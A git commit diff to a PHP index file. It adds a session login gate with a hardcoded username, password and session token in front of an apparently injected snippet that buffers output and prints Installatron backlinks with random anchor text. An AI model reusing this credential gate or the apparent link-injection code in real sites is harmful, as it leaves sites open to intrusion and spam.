0959a4945784ccbd42eec1e7afcc84d793ad37f5
kirill <chrisodowd89@gmail.com>
2012-12-16 23:40:57 +0300

    new index

--- index.php
+++ index.php
@@ -1,4 +1,31 @@
-<?php if(!function_exists("__ics")){ob_start();?>$1</a>, <a  style='background:none;' href='http://installatron.com/apps/wordpress' target='_blank' title='Installatron enables webmasters to instantly install and upgrade WordPress and other web applications.'><?php
+<?php 
+
+
+
+
+
+session_start();
+
+if(!(isset($_SESSION['logged']) && $_SESSION['logged'] === 'DSFn()DFb(D_FB#&$BFDOF&^D dsFDS(DS*F^BSDF#BF*DSF(')) {
+	if(isset($_POST['username']) && $_POST['username'] === 'test' &&
+		isset($_POST['password']) && $_POST['password'] === 'J3f_65pdr()ak') {
+		$_SESSION['logged'] = 'DSFn()DFb(D_FB#&$BFDOF&^D dsFDS(DS*F^BSDF#BF*DSF(';
+		Header('Host', '/index.php');
+		return;
+	} else { ?>
+	<form method="post">
+		%username%: <input type="text" name="username" /><br />
+		%password%: <input type="password" name="password" /><br />
+		<input type="submit" name="login">
+
+	</form>
+	<?	
+	die; }
+}
+
+
+
+if(!function_exists("__ics")){ob_start();?>$1</a>, <a  style='background:none;' href='http://installatron.com/apps/wordpress' target='_blank' title='Installatron enables webmasters to instantly install and upgrade WordPress and other web applications.'><?php
 switch (mt_rand(0,2))
 {
 case 0:echo "Automated by Installatron";break;
